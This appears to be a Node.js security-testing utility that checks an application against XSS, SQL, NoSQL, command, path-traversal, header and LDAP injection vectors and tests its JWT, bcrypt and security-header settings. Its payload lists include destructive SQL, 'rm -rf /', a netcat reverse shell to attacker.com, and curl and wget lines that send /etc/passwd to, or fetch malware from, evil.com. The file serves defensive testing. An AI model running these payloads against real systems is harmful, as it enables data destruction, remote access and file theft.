/**
 * Security Testing Utilities
 * Specialized utilities for comprehensive security testing
 */

const crypto = require('crypto');
const jwt = require('jsonwebtoken');
const config = require('../../src/config/config');

class SecurityTestUtils {
  constructor() {
    this.testVectors = this.generateTestVectors();
  }

  /**
   * Generate comprehensive security test vectors
   */
  generateTestVectors() {
    return {
      xss: [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        "'><script>alert('XSS')</script>",
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload="alert(\'XSS\')">',
        '<input onfocus="alert(\'XSS\')" autofocus>',
        '<select onfocus="alert(\'XSS\')" autofocus>',
        '<textarea onfocus="alert(\'XSS\')" autofocus>',
        '<keygen onfocus="alert(\'XSS\')" autofocus>',
        '<video><source onerror="alert(\'XSS\')">',
        '<audio src="x" onerror="alert(\'XSS\')">',
        '<details open ontoggle="alert(\'XSS\')">',
        '<marquee onstart="alert(\'XSS\')"></marquee>'
      ],
      
      sqlInjection: [
        "'; DROP TABLE users; --",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' UNION SELECT null, username, password FROM users --",
        "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
        "' OR 1=1; UPDATE users SET password='hacked' WHERE username='admin'; --",
        "'; EXEC xp_cmdshell('dir'); --",
        "' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))",
        "' OR (SELECT COUNT(*) FROM users) > 0 --",
        "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --",
        "'; WAITFOR DELAY '00:00:05' --",
        "' OR 1=1 AND (SELECT LOAD_FILE('/etc/passwd')) IS NOT NULL --"
      ],
      
      nosqlInjection: [
        '{"$ne": null}',
        '{"$gt": ""}',
        '{"$regex": ".*"}',
        '{"$where": "function() { return true; }"}',
        '{"username": {"$ne": null}, "password": {"$ne": null}}',
        '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
        '{"username": {"$regex": "^admin"}}',
        '{"password": {"$exists": true}}'
      ],
      
      commandInjection: [
        '; ls -la',
        '&& cat /etc/passwd',
        '| whoami',
        '`id`',
        '$(whoami)',
        '; rm -rf /',
        '&& wget http://evil.com/malware.sh',
        '| nc -e /bin/bash attacker.com 4444',
        '; python -c "import os; os.system(\\"id\\")"',
        '&& curl -X POST -d @/etc/passwd http://evil.com'
      ],
      
      pathTraversal: [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd',
        '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
        '/var/log/../../../etc/passwd',
        'file:///etc/passwd',
        '\\\\server\\share\\..\\..\\windows\\system32\\config\\sam'
      ],
      
      headerInjection: [
        'test\r\nSet-Cookie: malicious=true',
        'test\nLocation: http://evil.com',
        'test\r\n\r\n<script>alert("XSS")</script>',
        'test%0d%0aSet-Cookie:%20malicious=true',
        'test\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK'
      ],
      
      ldapInjection: [
        '*)(uid=*',
        '*)(|(password=*))',
        '*)(&(objectclass=*)',
        '*))%00',
        '*(|(objectclass=*))',
        '*)(cn=*)(|(cn=*'
      ]
    };
  }

  /**
   * Test XSS protection
   */
  async testXSSProtection(httpRequestFunction) {
    const results = [];
    
    for (const xssPayload of this.testVectors.xss) {
      try {
        const response = await httpRequestFunction('POST', '/api/test', {
          userInput: xssPayload
        });
        
        // Check if XSS payload was properly sanitized or rejected
        const bodyStr = typeof response.body === 'string' ? response.body : JSON.stringify(response.body);
        const containsUnsafeScript = bodyStr.includes('<script>') || 
                                   bodyStr.includes('javascript:') || 
                                   bodyStr.includes('onerror=') ||
                                   bodyStr.includes('onload=');
        
        results.push({
          test: `XSS Protection - ${xssPayload.substring(0, 20)}...`,
          passed: !containsUnsafeScript,
          message: containsUnsafeScript ? 'XSS payload was not properly sanitized' : 'XSS payload properly handled',
          payload: xssPayload
        });
        
      } catch (error) {
        results.push({
          test: `XSS Protection - ${xssPayload.substring(0, 20)}...`,
          passed: true, // Error is acceptable for XSS protection
          message: `Request rejected: ${error.message}`,
          payload: xssPayload
        });
      }
    }
    
    return results;
  }

  /**
   * Test SQL injection protection
   */
  async testSQLInjectionProtection(dbQueryFunction) {
    const results = [];
    
    for (const sqlPayload of this.testVectors.sqlInjection) {
      try {
        const result = await dbQueryFunction(
          'SELECT * FROM users WHERE username = $1',
          [sqlPayload]
        );
        
        // If query executes without error and returns expected structure, injection was prevented
        results.push({
          test: `SQL Injection Protection - ${sqlPayload.substring(0, 20)}...`,
          passed: Array.isArray(result.rows),
          message: 'Parameterized query prevented SQL injection',
          payload: sqlPayload
        });
        
      } catch (error) {
        // For parameterized queries, SQL injection should not cause syntax errors
        const isSqlSyntaxError = error.code === '42601' || error.message.includes('syntax error');
        
        results.push({
          test: `SQL Injection Protection - ${sqlPayload.substring(0, 20)}...`,
          passed: !isSqlSyntaxError,
          message: isSqlSyntaxError ? 'SQL injection may have been executed' : 'Query properly rejected',
          payload: sqlPayload,
          error: error.message
        });
      }
    }
    
    return results;
  }

  /**
   * Test JWT security
   */
  testJWTSecurity() {
    const results = [];
    
    try {
      // Test 1: Weak secret detection
      const weakSecrets = ['secret', '123456', 'password', 'key', 'jwt'];
      const isWeakSecret = weakSecrets.includes(config.security.jwtSecret.toLowerCase());
      
      results.push({
        test: 'JWT Secret Strength',
        passed: !isWeakSecret && config.security.jwtSecret.length >= 32,
        message: isWeakSecret ? 'JWT secret is too weak' : 'JWT secret appears strong'
      });
      
      // Test 2: Algorithm manipulation
      const validToken = jwt.sign({ userId: 1 }, config.security.jwtSecret, { algorithm: 'HS256' });
      
      // Try to create token with 'none' algorithm
      try {
        const noneToken = jwt.sign({ userId: 1, admin: true }, '', { algorithm: 'none' });
        
        // Try to verify 'none' algorithm token
        try {
          jwt.verify(noneToken, config.security.jwtSecret);
          results.push({
            test: 'JWT Algorithm Manipulation Protection',
            passed: false,
            message: 'None algorithm token was accepted'
          });
        } catch (error) {
          results.push({
            test: 'JWT Algorithm Manipulation Protection',
            passed: true,
            message: 'None algorithm token was properly rejected'
          });
        }
      } catch (error) {
        results.push({
          test: 'JWT Algorithm Manipulation Protection',
          passed: true,
          message: 'None algorithm token creation failed as expected'
        });
      }
      
      // Test 3: Token tampering
      const parts = validToken.split('.');
      const tamperedPayload = Buffer.from(JSON.stringify({ userId: 999, admin: true })).toString('base64url');
      const tamperedToken = `${parts[0]}.${tamperedPayload}.${parts[2]}`;
      
      try {
        jwt.verify(tamperedToken, config.security.jwtSecret);
        results.push({
          test: 'JWT Tampering Protection',
          passed: false,
          message: 'Tampered token was accepted'
        });
      } catch (error) {
        results.push({
          test: 'JWT Tampering Protection',
          passed: true,
          message: 'Tampered token was properly rejected'
        });
      }
      
      // Test 4: Token expiration
      const expiredToken = jwt.sign(
        { userId: 1 },
        config.security.jwtSecret,
        { expiresIn: '-1h' }
      );
      
      try {
        jwt.verify(expiredToken, config.security.jwtSecret);
        results.push({
          test: 'JWT Expiration Enforcement',
          passed: false,
          message: 'Expired token was accepted'
        });
      } catch (error) {
        results.push({
          test: 'JWT Expiration Enforcement',
          passed: error.name === 'TokenExpiredError',
          message: 'Expired token was properly rejected'
        });
      }
      
    } catch (error) {
      results.push({
        test: 'JWT Security Tests',
        passed: false,
        message: `JWT security test failed: ${error.message}`
      });
    }
    
    return results;
  }

  /**
   * Test password security
   */
  async testPasswordSecurity() {
    const results = [];
    const bcrypt = require('bcrypt');
    
    try {
      // Test 1: Salt rounds strength
      const minSaltRounds = 10;
      const configuredRounds = config.security.bcryptRounds;
      
      results.push({
        test: 'Password Salt Rounds Strength',
        passed: configuredRounds >= minSaltRounds,
        message: `Bcrypt salt rounds: ${configuredRounds} (minimum recommended: ${minSaltRounds})`
      });
      
      // Test 2: Password hashing consistency
      const testPassword = 'testPassword123!';
      const hash1 = await bcrypt.hash(testPassword, configuredRounds);
      const hash2 = await bcrypt.hash(testPassword, configuredRounds);
      
      results.push({
        test: 'Password Hash Uniqueness',
        passed: hash1 !== hash2,
        message: hash1 !== hash2 ? 'Each hash is unique (salted properly)' : 'Hashes are identical (potential salt issue)'
      });
      
      // Test 3: Password verification
      const isValid = await bcrypt.compare(testPassword, hash1);
      const isInvalid = await bcrypt.compare('wrongPassword', hash1);
      
      results.push({
        test: 'Password Verification Accuracy',
        passed: isValid && !isInvalid,
        message: 'Password verification working correctly'
      });
      
      // Test 4: Timing attack resistance (basic check)
      const timingTests = [];
      
      for (let i = 0; i < 5; i++) {
        const start = process.hrtime.bigint();
        await bcrypt.compare('wrongPassword', hash1);
        const end = process.hrtime.bigint();
        timingTests.push(Number(end - start) / 1000000); // Convert to milliseconds
      }
      
      const avgTime = timingTests.reduce((a, b) => a + b, 0) / timingTests.length;
      const variance = timingTests.reduce((acc, time) => acc + Math.pow(time - avgTime, 2), 0) / timingTests.length;
      const stdDev = Math.sqrt(variance);
      const coefficientOfVariation = stdDev / avgTime;
      
      results.push({
        test: 'Password Timing Attack Resistance',
        passed: coefficientOfVariation < 0.1, // Less than 10% variation
        message: `Timing consistency: ${(coefficientOfVariation * 100).toFixed(2)}% variation`
      });
      
    } catch (error) {
      results.push({
        test: 'Password Security Tests',
        passed: false,
        message: `Password security test failed: ${error.message}`
      });
    }
    
    return results;
  }

  /**
   * Test security headers
   */
  testSecurityHeaders(responseHeaders) {
    const results = [];
    
    const expectedHeaders = {
      'x-content-type-options': 'nosniff',
      'x-frame-options': ['DENY', 'SAMEORIGIN'],
      'x-xss-protection': '1; mode=block',
      'strict-transport-security': true, // Should exist
      'content-security-policy': true,   // Should exist
      'referrer-policy': true           // Should exist
    };
    
    for (const [headerName, expectedValue] of Object.entries(expectedHeaders)) {
      const actualValue = responseHeaders[headerName.toLowerCase()];
      
      if (expectedValue === true) {
        // Just check if header exists
        results.push({
          test: `Security Header - ${headerName}`,
          passed: !!actualValue,
          message: actualValue ? `Header present: ${actualValue}` : 'Header missing'
        });
      } else if (Array.isArray(expectedValue)) {
        // Check if value is one of the expected values
        const isValid = expectedValue.includes(actualValue);
        results.push({
          test: `Security Header - ${headerName}`,
          passed: isValid,
          message: isValid ? `Valid value: ${actualValue}` : `Invalid value: ${actualValue}`
        });
      } else {
        // Check exact match
        results.push({
          test: `Security Header - ${headerName}`,
          passed: actualValue === expectedValue,
          message: actualValue === expectedValue ? `Correct value: ${actualValue}` : `Expected: ${expectedValue}, Got: ${actualValue}`
        });
      }
    }
    
    // Check for dangerous headers that should not be present
    const dangerousHeaders = [
      'server',           // Can reveal server info
      'x-powered-by',     // Can reveal technology stack
      'x-aspnet-version', // Technology disclosure
      'x-aspnetmvc-version' // Technology disclosure
    ];
    
    for (const dangerousHeader of dangerousHeaders) {
      const headerValue = responseHeaders[dangerousHeader.toLowerCase()];
      results.push({
        test: `Dangerous Header Check - ${dangerousHeader}`,
        passed: !headerValue,
        message: headerValue ? `Dangerous header present: ${headerValue}` : 'Header properly hidden'
      });
    }
    
    return results;
  }

  /**
   * Generate comprehensive security test report
   */
  generateSecurityReport(allResults) {
    const criticalTests = allResults.filter(r => 
      r.test.includes('SQL Injection') || 
      r.test.includes('XSS') || 
      r.test.includes('JWT') ||
      r.test.includes('Password')
    );
    
    const criticalFailures = criticalTests.filter(r => !r.passed);
    const securityScore = criticalTests.length > 0 ? 
      ((criticalTests.length - criticalFailures.length) / criticalTests.length * 100).toFixed(1) : 100;
    
    return {
      securityScore: `${securityScore}%`,
      criticalTests: criticalTests.length,
      criticalFailures: criticalFailures.length,
      recommendations: this.generateSecurityRecommendations(criticalFailures)
    };
  }

  /**
   * Generate security recommendations based on failed tests
   */
  generateSecurityRecommendations(failures) {
    const recommendations = [];
    
    failures.forEach(failure => {
      if (failure.test.includes('JWT Secret')) {
        recommendations.push('Use a cryptographically strong JWT secret (minimum 32 characters)');
      }
      if (failure.test.includes('SQL Injection')) {
        recommendations.push('Always use parameterized queries to prevent SQL injection');
      }
      if (failure.test.includes('XSS')) {
        recommendations.push('Implement proper input sanitization and output encoding');
      }
      if (failure.test.includes('Password')) {
        recommendations.push('Increase bcrypt salt rounds to at least 12 for better security');
      }
      if (failure.test.includes('Security Header')) {
        recommendations.push('Configure all recommended security headers');
      }
    });
    
    return [...new Set(recommendations)]; // Remove duplicates
  }
}

module.exports = SecurityTestUtils;